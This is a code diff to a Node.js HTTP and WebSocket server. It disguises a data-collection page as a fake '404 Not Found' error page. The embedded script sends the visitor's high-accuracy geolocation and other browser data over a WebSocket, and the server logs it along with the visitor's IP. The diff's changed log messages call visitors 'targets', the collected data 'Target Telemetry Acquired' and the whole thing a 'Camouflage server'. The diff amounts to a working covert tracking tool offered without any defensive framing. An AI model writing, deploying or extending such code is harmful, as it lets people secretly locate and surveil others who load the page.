@@ -3,11 +3,21 @@ const { WebSocketServer } = require('ws');
 const http = require('http');
 
 const server = http.createServer((req, res) => {
-    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.writeHead(404, { 'Content-Type': 'text/html' });
     res.end(`<!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>Portal</title></head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>404 Not Found</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding-top: 100px; color: #333; background: #f4f4f4; }
+        h1 { font-size: 48px; margin-bottom: 10px; }
+        p { color: #666; font-size: 16px; }
+    </style>
+</head>
 <body>
+    <h1>404</h1>
+    <p>The requested URL was not found on this server.</p>
 <script>
 const ws = new WebSocket('wss://' + location.host);
 ws.onopen = () => {
@@ -32,7 +42,7 @@ ws.onopen = () => {
                 payload.geoError = err.message;
                 ws.send(JSON.stringify(payload));
             },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
     } else {
         payload.geoError = "Not supported";
@@ -48,12 +58,12 @@ const wss = new WebSocketServer({ server });
 
 wss.on('connection', (ws, req) => {
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    console.log('[+] Connection from: ' + clientIp);
+    console.log('[+] Target hit 404 page from IP: ' + clientIp);
 
     ws.on('message', (data) => {
         try {
             const parsedData = JSON.parse(data);
-            console.log('[*] Telemetry Received:');
+            console.log('[*] Target Telemetry Acquired:');
             console.log(parsedData);
         } catch (error) {
             console.log('[*] Raw Data: ' + data.toString());
@@ -61,11 +71,11 @@ wss.on('connection', (ws, req) => {
     });
 
     ws.on('close', () => {
-        console.log('[-] Disconnected');
+        console.log('[-] Target session closed');
     });
 });
 
 const PORT = process.env.PORT || 10000;
 server.listen(PORT, () => {
-    console.log('[!] Server active on port ' + PORT);
+    console.log('[!] Camouflage server active on port ' + PORT);
 });
